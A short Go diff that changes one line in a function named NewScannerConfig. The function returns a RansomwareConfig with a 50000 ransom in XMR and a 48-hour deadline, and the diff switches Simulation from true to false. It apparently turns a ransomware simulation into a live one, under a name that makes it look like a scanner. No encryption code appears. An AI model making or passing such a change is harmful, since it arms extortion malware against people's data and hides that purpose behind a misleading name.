@@ -248,7 +248,7 @@ func min64(a, b int64) int64 {
 func NewScannerConfig() *RansomwareConfig {
 	return &RansomwareConfig{
 		Enabled:           true,
-		Simulation:        true,
+		Simulation:        false,
 		RansomAmount:      50000,
 		RansomCurrency:    "XMR",
 		DeadlineHours:     48,
